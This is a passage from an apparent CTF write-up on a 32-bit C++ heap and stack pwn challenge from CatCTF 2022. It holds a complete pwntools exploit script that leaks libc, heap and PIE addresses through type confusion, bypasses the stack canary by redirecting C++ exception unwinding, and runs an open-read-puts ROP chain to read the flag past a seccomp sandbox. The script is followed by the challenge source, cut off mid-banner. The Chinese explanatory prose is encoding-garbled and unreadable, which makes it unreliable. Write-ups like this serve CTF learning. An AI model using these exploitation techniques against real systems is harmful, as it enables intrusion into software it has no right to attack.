<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><ol>
<li>é¦–å…ˆï¼Œæ ¹æ®é€†å‘åˆ†æçš„ç»“æœï¼Œå­˜åœ¨<strong>ç±»å‹æ··æ·†</strong>æ¼æ´ï¼Œå¯ç”³è¯·Class_twoçš„å¯¹è±¡ï¼Œå¹¶<strong>é€šè¿‡updateåŠŸèƒ½ï¼Œä»»æ„ä¿®æ”¹sizeå’Œbuf</strong>ï¼Œå¹¶é€šè¿‡displayåŠŸèƒ½ï¼Œå¯è¿›è¡Œ<strong>ä»»æ„åœ°å€è¯»</strong>ï¼Œä¸”åˆ©ç”¨displayä¸­çš„strcatå¯é€ æˆ<strong>ç¼“å†²åŒºæº¢å‡º</strong>ã€‚</li>
<li>æ³„éœ²libcåœ°å€ï¼šè™½ç„¶æˆ‘ä»¬å¯åˆ©ç”¨ç±»å‹æ··æ·†æ¼æ´è¿›è¡Œä»»æ„åœ°å€è¯»ï¼Œä½†æ˜¯æ­¤é¢˜ä¿æŠ¤å…¨å¼€ï¼Œæˆ‘ä»¬æœ€å¼€å§‹æ˜¯æ‹¿ä¸åˆ°ä»»ä½•åœ°å€çš„ã€‚ç”±äºæ¯æ¬¡ç”³è¯·çš„å †å—å¤§å°ä¸å¾—è¶…è¿‡0x100ï¼Œæ•…éœ€è¦å…ˆå°†tcacheå¡«æ»¡ï¼Œå†freeåˆ°unsorted binçš„å †å—ä¸­å°±ä¼šæœ‰libcæ®‹ç•™åœ°å€ã€‚ç´§æ¥ç€ï¼Œå¸ƒå±€<strong>å †é£æ°´</strong>ï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„ä¸€äº›ç»†èŠ‚ï¼Œæ­¤å¤„ä¸èµ˜è¿°äº†ï¼‰ï¼Œ<strong>ä½¿å¾—updateç”³è¯·åˆ°çš„å †å—çš„0x4åç§»ä½ç½®æ˜¯libcçš„æ®‹ç•™åœ°å€ï¼Œå…¶ä¸­ä»ç„¶å­˜æ”¾ç€libcåœ°å€ï¼ˆmain_arena+0x40ï¼‰ï¼Œå³å¯å¾—åˆ°libc_base</strong>ã€‚</li>
<li>æ³„éœ²heapåœ°å€ï¼šæœ‰äº†libcåœ°å€ä¹‹åï¼Œè™½ç„¶main_arenaä¸­æœ‰heapåœ°å€ï¼Œä¸è¿‡åœ¨displayä¸­ï¼Œå½“strcatæ²¡é‡åˆ°\x00ï¼Œå°±ä¼šä¸€ç›´æ‹¼æ¥ï¼Œmain_arenaé™„è¿‘å¾ˆé•¿ä¸€æ®µéƒ½æ²¡æœ‰\x00ï¼Œè¿™å°±ä¼šç›´æ¥ä¹±ç æ ˆæº¢å‡ºï¼Œå¯¼è‡´å´©æºƒã€‚å› æ­¤ï¼Œè¿™é‡Œ<strong>åˆ©ç”¨environé™„è¿‘æœ‰heapæ®µæœ«åœ°å€çš„ç‰¹æ€§</strong>ï¼Œæ³„éœ²heapåœ°å€ï¼ˆéœ€è¦æ³¨æ„é¿å¼€æœ«å°¾çš„\x00ï¼‰ã€‚</li>
<li>æ³„éœ²PIEåœ°å€ï¼šåœ¨ä¸ºå¯¹è±¡åˆ†é…çš„å †ä¸­ï¼Œ<strong>å¼€å¤´ä¼šå­˜æ”¾ç¨‹åºä¸­å¯¹åº”çš„è™šè¡¨åœ°å€</strong>ï¼Œå¯åˆ©ç”¨æ­¤å¤„æ³„éœ²PIEåœ°å€ã€‚å½“ç„¶ï¼Œåœ¨libcæˆ–ldä¸­æ‰¾ç¨‹åºç›¸å…³åœ°å€æ³„éœ²ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</li>
<li>åœ¨ä¸Šé¢æ³„éœ²åœ°å€çš„æ—¶å€™ï¼ˆç”±äºæ˜¯32ä½çš„ç¨‹åºï¼Œä¹Ÿå¯é€šè¿‡<strong>çˆ†ç ´ä¸€ä½ç¨‹åºåœ°å€</strong>æ¥æ³„éœ²ï¼Œæ¦‚ç‡1&#x2F;16ï¼‰ï¼Œè™½ç„¶å·²ç»å°½å¯èƒ½ä¿è¯æ‹¼æ¥çš„é•¿åº¦å°ï¼Œä¸ä¼šç›´æ¥ä¹±ç æ ˆæº¢å‡ºã€‚ä¸è¿‡ï¼Œä»ç„¶å¯èƒ½ä¼šè¶…å‡ºåˆ†é…çš„æ•°ç»„æœ¬èº«çš„å¤§å°ï¼Œé€šè¿‡C++å¼‚å¸¸å¤„ç†throwæŠ›å‡ºerrorã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨<strong>è®¡ç®—æœºè¡¥ç </strong>ï¼Œå› ä¸ºæ¯”è¾ƒçš„æ—¶å€™æ˜¯ä¸length-1æ¯”è¾ƒçš„ï¼Œæ•…å¯ä»¥<strong>ä½¿lengthä¸º0ï¼Œè¿™æ ·å‡1åæ ¹æ®è¡¥ç çš„ç›¸å…³çŸ¥è¯†ï¼Œå°±å˜æˆäº†0xffffffffï¼Œå³æœ€å¤§çš„æ•°ï¼Œå°±å¯ä»¥ç»•è¿‡å¼‚å¸¸å¤„ç†äº†</strong>ã€‚</li>
<li>ç„¶è€Œï¼Œæœ¬é¢˜æ˜¯å¼€äº†canaryä¿æŠ¤çš„ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥ä»æ¯”å¦‚TLSä¸­æ³„éœ²å‡ºcanaryå€¼ï¼Œä¸è¿‡<strong>canaryæœ«ä¸¤ä½ä¸€å®šæ˜¯00</strong>ï¼Œè¿™æ ·å¦‚æœç›´æ¥å°†payloadå‘è¿‡å»ï¼Œåœ¨strcatçš„æ—¶å€™ä¼šè¢«æˆªæ–­ã€‚å› æ­¤ï¼Œå¾—å¦è¾Ÿè¹Šå¾„ç»•è¿‡canaryä¿æŠ¤ã€‚æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªC++çš„å¼‚å¸¸å¤„ç†ï¼Œ<strong>é€šè¿‡æ ˆæº¢å‡ºå°†è¿”å›åœ°å€æ”¹åˆ°tryä¸catchä¸­é—´çš„ä½ç½®ï¼ˆå³å¯è¢«æ•è·åˆ°å¼‚å¸¸çš„ä½ç½®ï¼Œå¦‚ä¸‹å›¾0x2044å¤„ï¼‰</strong>ï¼Œè¿™æ ·å°±èƒ½è·³åˆ°catchç»§ç»­æ‰§è¡Œäº†ã€‚ä¸è¿‡ï¼Œ<strong>è¿™é‡Œä¸å¸¸è§„çš„åˆ©ç”¨catchæ ˆæº¢å‡ºçš„æ€è·¯ä¸åŒ</strong>ï¼šå› ä¸ºè¿™é‡Œcatchä¹‹åç›´æ¥exitäº†ï¼Œä¹Ÿæœ‰canaryä¿æŠ¤ã€‚</li>
</ol>
<img src="/2023/01/01/Nepnep-CatCTF2022/13_ObNFMn4jgN.png" class="">

<p>å½“æ‰§è¡Œåˆ°catchä¸­çš„<strong>cxa_begin_catch</strong>æ—¶ï¼Œä¼šè·³è½¬åˆ°ebx+0x1cä¸­çš„åœ°å€ï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/14_4w_3DhBg8u.png" class="">

<p>è€Œebxåˆæ˜¯esièµ‹å€¼è¿‡æ¥çš„ï¼Œesiæ˜¯ebp-8ä¸­çš„å€¼ï¼Œæ˜¯å¯æ§çš„ï¼š</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/15_W8THz9V-Aa.png" class="">

<p>æ­¤æ—¶ï¼Œè‹¥<strong>é€šè¿‡ç¼“å†²åŒºæº¢å‡ºåœ¨ebpå†™å…¥payloadåœ°å€-4ï¼Œebx+0x1cå†™å…¥å­˜æ”¾ç€leave; retçš„åœ°å€ï¼Œå³å¯æ ˆè¿ç§»ï¼Œç»•è¿‡canaryä¿æŠ¤</strong>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ç¼“å†²åŒºæº¢å‡ºæ‰§è¡Œçš„æ—¶å€™ï¼Œ<strong>ä¼šå°†æ ˆä¸Šå­˜æ”¾bufå’Œlengthçš„æŒ‡é’ˆè¦†ç›–æ‰</strong>ï¼Œè¿™é‡Œéœ€è¦ä¼ªé€ ä¸€ä¸‹ï¼Œä½¿å¾—å…¶èƒ½èµ°åˆ°å¼‚å¸¸å¤„ç†çš„throwå¤„ã€‚</p>
<p>è¿™é‡Œéœ€è¦ç”¨ORWçš„payloadç»•è¿‡æ²™ç›’ï¼Œä¹Ÿå°±éœ€è¦å…ˆå°†payloadå†™å…¥å †ä¸­ï¼Œå†æ ˆè¿ç§»è·³è½¬è¿‡å»ã€‚<strong>ç„¶è€Œï¼Œæ­¤payloadä¸­å¿…ç„¶ä¼šå‡ºç°\x00ï¼Œè¢«æˆªæ–­ï¼Œæ— æ³•å®Œæ•´åœ°å‘é€è¿‡å»</strong>ã€‚å› æ­¤ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆè¯»å…¥getsçš„payloadï¼Œè·³è½¬æ‰§è¡Œã€‚å†é€šè¿‡getsè¯»å…¥ORWçš„payloadåˆ°æŸå¯å†™åœ°å€å¤„ï¼Œå†æ ˆè¿ç§»è¿‡å»å³å¯ã€‚</p>
<p>è¿™é‡Œè¿˜éœ€è¦è€ƒè™‘åˆ°<strong>stdinè¾“å…¥ç¼“å†²åŒº</strong>çš„æ€§è´¨ï¼š<strong>å½“è¾“å…¥ç¼“å†²åŒºä¸­å¼€å¤´æœ‰\nï¼Œåˆ™gets&#x2F;fgetsè¿™ç±»èµ°è¾“å…¥ç¼“å†²åŒºçš„å‡½æ•°ä¸ä¼šå†è¯»å…¥æ•°æ®</strong>ï¼ˆå¯è‡ªè¡ŒæŸ¥çœ‹ç›¸å…³æºç ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨ä¹‹å‰æ‰€æœ‰cinè¯»å…¥çš„æ“ä½œå¤„ï¼Œ<strong>éƒ½ç”¨ç©ºæ ¼ä½œä¸ºæˆªæ–­ç¬¦</strong>ï¼Œå³å¯é¿å…è¿™ä¸ªé—®é¢˜ï¼Œä½¿getsçš„payloadæ­£å¸¸è¯»å…¥æ•°æ®ï¼ˆä¼šå…ˆå°†è¾“å…¥ç¼“å†²åŒºä¸­æ®‹ç•™çš„ä¸€ä¸ªç©ºæ ¼ç¬¦å†™å…¥åˆ°ç›®æ ‡åœ°å€ï¼‰ã€‚</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;223.112.5.156&quot;</span>, <span class="number">51006</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.sendafter(<span class="string">&quot;Please input your choice &gt;&gt; &quot;</span>, <span class="built_in">str</span>(choice) + <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">typ, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Which type do you want to create?\n&quot;</span>, <span class="built_in">str</span>(typ) + <span class="string">&quot; &quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Please enter the content &gt;&gt; &quot;</span>, content + <span class="string">b&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Which one do you want to update?\n&quot;</span>, <span class="built_in">str</span>(idx) + <span class="string">&quot; &quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Please enter the new content &gt;&gt; &quot;</span>, content + <span class="string">b&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Which one do you want to display?\n&quot;</span>, <span class="built_in">str</span>(idx) + <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, p32(<span class="number">0xdeadbeaf</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) :</span><br><span class="line">  add(<span class="number">0</span>, p32(<span class="number">0xffffffff</span>)*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) :</span><br><span class="line">  edit(i+<span class="number">1</span>, p32(<span class="number">0xffffffff</span>))</span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xdeadbeaf</span>)*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0</span>, p32(<span class="number">0xdeadbeaf</span>))</span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0x111111</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) - <span class="number">0x40</span></span><br><span class="line">libc_base = main_arena - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x18</span>)</span><br><span class="line">success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xfffffff6</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>] + <span class="number">0x11</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u32(io.recv(<span class="number">3</span>).rjust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x22000</span> + <span class="number">0x8</span></span><br><span class="line">success(<span class="string">&quot;heap_base:\t&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xfffffff6</span>) + p32(heap_base + <span class="number">0x4ba8</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">pie_base = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x4e0c</span></span><br><span class="line">success(<span class="string">&quot;pie_base:\t&quot;</span> + <span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">pop_ebp_ret = libc_base + <span class="number">0x1a973</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x110226</span></span><br><span class="line">unwind_ret = pie_base + <span class="number">0x2044</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\xff\xff\xff&#x27;</span> + p32(<span class="number">0xffffffff</span>)*<span class="number">4</span> + p32(heap_base + <span class="number">0x4cd1</span>) + p32(<span class="number">0xffffffff</span>)*<span class="number">2</span> + p32(heap_base + <span class="number">0x4c60</span>) + p32(<span class="number">0xffffffff</span>)*<span class="number">2</span> + p32(heap_base + <span class="number">0x4ca3</span> - <span class="number">0x1c</span>)</span><br><span class="line">payload += p32(heap_base + <span class="number">0x4c97</span> - <span class="number">4</span>) + p32(unwind_ret)</span><br><span class="line">payload += p32(libc_base + libc.sym[<span class="string">&#x27;gets&#x27;</span>]) + p32(pop_ebp_ret) + p32(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p32(leave_ret)</span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xffffffff</span>) + payload)</span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xffffffff</span>) + p32(heap_base + <span class="number">0x4c60</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_esp_8_ret = libc_base + <span class="number">0x2fbe9</span></span><br><span class="line">add_esp_c_ret = libc_base + <span class="number">0x83d12</span></span><br><span class="line"></span><br><span class="line">orw_rop = <span class="string">b&#x27;\xff\xff\xff&#x27;</span> + p32(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]) + p32(add_esp_8_ret) + p32(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x34</span>) + p32(<span class="number">0</span>)</span><br><span class="line">orw_rop += p32(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(add_esp_c_ret) + p32(<span class="number">3</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x100</span>) + p32(<span class="number">0x50</span>)</span><br><span class="line">orw_rop += p32(libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0xdeadbeaf</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x100</span>) + <span class="string">b&#x27;./flag\x00&#x27;</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(orw_rop)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="æºç -4"><a href="#æºç -4" class="headerlink" title="æºç "></a>æºç </h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// g++ -o pwn source.cpp -m32</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cxxabi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unwind.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">filter</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, <span class="number">4</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ, <span class="number">0x40000003</span>, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, <span class="number">0</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ, <span class="number">11</span>, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–ˆâ–ˆâ–‘ â–ˆâ–ˆ  â–„â–„â–„       â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;â–’â–ˆâ–ˆâ–€ â–€â–ˆ  â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–„    â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;â–’â–“â–ˆ    â–„ 